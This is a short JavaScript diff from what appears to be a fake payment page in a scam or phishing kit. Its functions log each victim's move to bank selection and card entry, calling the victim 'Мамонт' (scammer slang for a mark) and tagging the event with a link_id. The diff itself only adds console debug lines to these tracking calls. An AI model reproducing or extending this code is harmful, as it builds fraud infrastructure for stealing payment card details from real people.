@@ -2434,8 +2434,12 @@ function openBankModal() {
   // Логирование: переход на выбор банка
   const urlParams = new URLSearchParams(window.location.search);
   const link_id = urlParams.get('link_id') || 'нет';
+  console.log('🏦 Bank modal opened, logging...', link_id);
   if (typeof sendLog === 'function') {
+    console.log('✅ sendLog exists, sending...');
     sendLog('payment_flow', `Мамонт перешел на выбор банка\nЛинк айди: ${link_id}`);
+  } else {
+    console.error('❌ sendLog is not defined!');
   }
 }
 
@@ -2451,8 +2455,12 @@ function openCardModal() {
   // Логирование: переход на ввод карты
   const urlParams = new URLSearchParams(window.location.search);
   const link_id = urlParams.get('link_id') || 'нет';
+  console.log('💳 Card modal opened, logging...', link_id);
   if (typeof sendLog === 'function') {
+    console.log('✅ sendLog exists, sending...');
     sendLog('payment_flow', `Мамонт перешел на ввод карты\nЛинк айди: ${link_id}`);
+  } else {
+    console.error('❌ sendLog is not defined!');
   }
 }
 
